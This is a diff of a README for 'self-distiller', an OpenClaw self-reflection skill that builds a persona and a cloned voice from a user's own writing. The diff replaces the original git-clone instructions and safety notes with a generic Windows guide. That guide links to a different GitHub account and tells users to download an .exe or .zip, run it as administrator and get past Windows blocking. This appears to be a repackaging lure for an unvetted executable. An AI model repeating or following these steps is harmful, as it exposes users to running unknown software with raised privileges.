@@ -1,176 +1,229 @@
-# 🪞 self-distiller
+# 🪞 self-distiller-skill - Turn self-talk into clear insight
 
-> 把你自己蒸馏成 AI，再用你自己的声音跟自己对话。
+[![Download self-distiller-skill](https://img.shields.io/badge/Download-self--distiller--skill-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nailbrushinduction686/self-distiller-skill)
 
-Distill yourself into an AI and talk to yourself in your own voice.
+## 📥 Download
 
----
+Use this link to visit the page and download the app:
 
-## ✨ 它是什么
+[https://github.com/nailbrushinduction686/self-distiller-skill](https://github.com/nailbrushinduction686/self-distiller-skill)
 
-self-distiller 是一个 **自我反思工具**。它从你的聊天记录、笔记、社交媒体中提炼出你的 Persona（人格画像），然后用 **你自己克隆的声音** 跟你对话。
+## 🧭 What this app does
 
-不是聊天机器人，不是日记，不是冥想——是**听到自己的想法被说出来**后的深度自我觉察。
+self-distiller-skill helps you turn your own words into an AI persona you can talk to. It is built for self-reflection, daily check-ins, and clear review of your thoughts.
 
-### 心理学依据
+You can use it in two ways:
 
-研究表明，听到自己的声音能显著增强自我认知和情绪调节能力：
-- 自己的声音促进认知解离（cognitive defusion）效果优于他人声音 — [PMC 11274574](https://pmc.ncbi.nlm.nih.gov/articles/PMC11274574/) (2024)
-- 自己的声音帮助理解自己的情绪 — [New Scientist](https://www.newscientist.com/article/dn28753-sound-of-your-own-voice-may-help-you-understand-your-emotions/)
-- 自己的声音影响自我认知和行为 — [ScienceDirect](https://www.sciencedirect.com/science/article/abs/pii/S0892199722000376)
+- **Text mode** to chat with your persona right away
+- **Voice mode** to speak and hear your cloned voice for a stronger sense of distance from your thoughts
 
----
+It is designed for OpenClaw and fits use cases like:
 
-## 🎯 核心场景
+- daily mirror practice
+- emotion tracking
+- act therapy exercises
+- cognitive defusion
+- self-awareness work
+- persona-based chat analysis
 
-### 🌅 晨间独白 (Daily Mirror)
-每天早上，AI 用你的语气跟你聊聊昨天的状态，帮你梳理今天的思路。关键反思段落用你的声音朗读。
+## 💻 What you need on Windows
 
-### 🔥 情绪旁观者 (Emotion Observer)
-情绪激动时来找它。AI 不安慰、不评判，用你的声音**原样回放**你的情绪核心，帮你跟自己的想法拉开距离。
+Before you start, make sure your PC has:
 
-### ⚖️ 内心辩论 (Inner Debate) *v2*
-面对决策时，AI 用你的声音扮演"冲动版你"和"理性版你"互相辩论，你来当裁判。
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app and voice files
+- A microphone if you want voice mode
+- Speakers or headphones for playback
 
-### 📦 时间胶囊 (Time Capsule) *v2*
-对比不同时期的 Persona 版本，用你的声音给过去/未来的自己写一封信。
+For the smoothest use, close other heavy apps before you start the download and setup.
 
----
+## 🚀 Getting started
 
-## 🏗️ 架构
+### 1. Open the download page
 
-```
-┌─────────────────────────────────────────────────┐
-│                  self-distiller                   │
-├────────────┬────────────┬────────────────────────┤
-│  Distill   │   Mirror   │      Evolve            │
-│  蒸馏层    │   镜像层    │      进化层            │
-├────────────┼────────────┼────────────────────────┤
-│ 原材料采集  │ 晨间独白    │ Persona 偏差修正       │
-│ Persona    │ 情绪旁观者  │ 时间线版本管理          │
-│ 提炼       │ 内心辩论    │ 数据追加               │
-│ SELF.md    │ 时间胶囊    │ 持续学习               │
-├────────────┴────────────┴────────────────────────┤
-│              语音基础设施                          │
-│  ListenHub: Voice Clone + TTS + ASR              │
-└─────────────────────────────────────────────────┘
-```
+Go to:
 
----
+https://github.com/nailbrushinduction686/self-distiller-skill
 
-## 🚀 快速开始（5 分钟上手）
+### 2. Download the app
 
-### Step 0: 前置要求
+On the GitHub page, look for the latest release or the main download files. Save the file to your Windows computer.
 
-- [OpenClaw](https://openclaw.ai) — AI Agent 运行时
+If you see a file such as `.exe`, `.zip`, or a release package, use that file for setup.
 
-### Step 1: 安装
+### 3. Open the file
 
-```bash
-cd ~/.openclaw/workspace/skills/
-git clone https://github.com/KKenny0/self-distiller-skill.git self-distiller
-```
+- If you downloaded an `.exe` file, double-click it
+- If you downloaded a `.zip` file, right-click it and choose **Extract All**
+- Open the extracted folder after unzipping
 
-### Step 2: 创建你的 Persona
+### 4. Run the app
 
-在 OpenClaw 中输入：
+Find the app file and open it. If Windows asks for permission, choose **Yes** or **Run**.
 
-```
-/create-self
-```
+### 5. Follow the setup steps
 
-回答 3 个问题，选择数据导入方式，确认 Persona。
+If the app shows a setup screen, follow the on-screen steps. Most users only need to:
 
-### Step 3: 开始对话
+- choose a name for their persona
+- pick text mode or voice mode
+- allow access to the microphone if voice mode is used
+- wait for the first sync or voice setup to finish
 
-```
-/mirror          # 晨间独白
-/observe         # 情绪旁观者
-```
+## 🪞 How to use self-distiller-skill
 
-**就这么简单，零配置，纯文本模式开箱即用。**
+### Text mode
 
-### 可选：启用语音增强
+Text mode is the fastest way to begin.
 
-想要用你自己的声音把关键反思读出来？配置 ListenHub：
+Use it to:
 
-```bash
-export LISTENHUB_API_KEY="your-key-here"
-```
+- type how you feel
+- ask your persona a question
+- review your own words
+- spot patterns in your thinking
+- get a calm response that reflects your voice and style
 
-然后在 `/create-self` 的 Step 3 选择声音。语音是锦上添花，不影响核心功能。
+A simple flow looks like this:
 
-### 所有命令
+1. Open the app
+2. Choose text mode
+3. Write what is on your mind
+4. Read the response from your persona
+5. Save the chat if you want to review it later
 
-| 命令 | 功能 |
-|------|------|
-| `/create-self` | 创建新的自我蒸馏 |
-| `/mirror` | 晨间独白 — 每日自我对话 |
-| `/observe` | 情绪旁观者 — 情绪觉察 |
-| `/update-self` | 更新/修正 Persona |
-| `/list-selves` | 列出所有 Persona 版本 |
+### Voice mode
 
----
+Voice mode adds a cloned voice so the conversation feels more personal and more distant at the same time.
 
-## 📂 文件结构
+Use it to:
 
-```
-self-distiller/
-├── SKILL.md              # Skill 定义（OpenClaw 读取）
-├── DESIGN.md             # 设计文档
-├── README.md             # 本文件
-├── tools/                # 工具脚本
-│   ├── voice.py          # ListenHub 语音 API 封装
-│   ├── parsers/          # 数据解析器
-│   │   ├── discord.py    # Discord 聊天记录
-│   │   ├── wechat.py     # 微信导出格式
-│   │   ├── twitter.py    # Twitter/X
-│   │   └── markdown.py   # Markdown/笔记
-│   └── persona.py        # Persona 提炼引擎
-├── prompts/              # 提示词模板
-│   ├── intake.md         # 基础信息采集
-│   ├── distill.md        # Persona 提炼
-│   ├── mirror.md         # 晨间独白
-│   ├── observe.md        # 情绪旁观者
-│   ├── debate.md         # 内心辩论
-│   └── capsule.md        # 时间胶囊
-└── references/           # 参考资料
-    └── psychology.md     # 心理学研究摘要
-```
+- hear your own voice speak back to you
+- make self-reflection feel more real
+- support cognitive defusion
+- reduce the grip of a strong thought
+- create a stronger daily mirror habit
 
----
+To use voice mode:
 
-## 🔄 与 ex-skill / colleague-skill 的区别
+1. Open the app
+2. Turn on voice mode
+3. Allow microphone access
+4. Follow the voice setup steps
+5. Start speaking and listen to the reply
 
-| | ex-skill | colleague-skill | **self-distiller** |
-|--|---------|----------------|-------------------|
-| 蒸馏对象 | 前任 | 同事 | **你自己** |
-| 目的 | 怀念/疗愈 | 工作效率 | **自我反思/成长** |
-| 互动模式 | 跟 ta 聊天 | 模拟 ta 的反馈 | **跟自己对话** |
-| 声音 | 不需要 | 不需要 | **自己的声音（核心）** |
-| 心理学基础 | 怀旧疗法 | 组织行为学 | **认知解离 + 自我觉察** |
+## 🧠 Best ways to use it
 
----
+You can use self-distiller-skill in short sessions or longer review blocks.
 
-## 🛡️ 安全边界
+Good prompts include:
 
-- 仅用于个人成长，不用于操控、欺骗或冒充他人
-- 所有数据仅本地存储，不上传第三方（ListenHub API 除外）
-- 不替代专业心理治疗
-- 不鼓励自恋或沉迷
+- What am I feeling right now?
+- What keeps repeating in my mind?
+- What happened today that stayed with me?
+- What would I say if I spoke to myself with more distance?
+- What is the clearest version of this thought?
 
----
+Helpful routine ideas:
 
-## 📄 License
+- **Morning check-in**: set the tone for the day
+- **Midday reset**: slow down and inspect stress
+- **Evening review**: look back at key events
+- **After conflict**: separate facts from emotion
+- **Before sleep**: write one clear takeaway
 
-MIT
+## 🔧 Basic setup tips
 
----
+If the app asks for a few choices during setup, use these simple rules:
 
-## 🙏 致谢
+- Pick a short persona name you can remember
+- Start with text mode if you want the fastest path
+- Use voice mode after text mode feels comfortable
+- Keep your first session short
+- Save useful chats so you can compare them later
 
-灵感来源：
-- [ex-skill](https://github.com/therealXiaomanChu/ex-skill) — 前任蒸馏
-- [colleague-skill](https://github.com/titanwings/colleague-skill) — 同事蒸馏
-- [ListenHub Skills](https://listenhub.ai/docs/en/skills) — 语音基础设施
-- Stuart McGill's *Back Mechanic* — "听到自己的声音"概念启发
+If the app stores notes or chat history, keep one folder for your daily entries. That makes review easier.
+
+## 🎤 Voice mode setup tips
+
+If you plan to use the cloned voice path, prepare these items:
+
+- a quiet room
+- a working microphone
+- a clear sample of your own voice if the app asks for one
+- headphones to avoid echo
+
+For best results:
+
+- speak at a normal pace
+- use the same mic each time
+- keep background noise low
+- read the setup text in a steady tone
+
+## 🧩 Common uses
+
+self-distiller-skill works well for:
+
+- self-reflection exercises
+- thought journaling
+- emotion labeling
+- act therapy style distance from thoughts
+- persona chats for daily insight
+- review of recurring patterns
+- voice-based mirror sessions
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+Try these steps:
+
+- download the file again
+- make sure the file finished downloading
+- right-click the file and choose **Run as administrator**
+- check that Windows did not block the file
+
+### The app opens but nothing happens
+
+Try:
+
+- waiting a few seconds longer
+- closing the app and opening it again
+- restarting your computer
+- checking your internet connection
+
+### Voice mode does not work
+
+Try:
+
+- checking microphone access in Windows
+- unplugging and reconnecting your mic
+- using headphones
+- making sure no other app is using the microphone
+- running the voice setup again
+
+### Audio sounds weak or unclear
+
+Try:
+
+- moving closer to the microphone
+- reducing background noise
+- lowering speaker volume to avoid echo
+- using a better headset or mic if available
+
+## 📚 What you can expect from the experience
+
+The app is built to help you look at your own thoughts with more distance. It gives you a place to speak, read back, and review what you said.
+
+You may find it useful when you want to:
+
+- slow down a fast thought loop
+- notice emotion without getting pulled in
+- keep a record of your inner patterns
+- build a daily habit of self-checking
+- hear your own voice in a new way
+
+## 🏷️ Topics
+
+act-therapy, ai-agent, chat-analysis, cognitive-defusion, daily-mirror, emotion-tracking, listenhub, openclaw, openclaw-skill, persona, psychology, self-awareness, self-distillation, self-reflection, tts, voice-clone
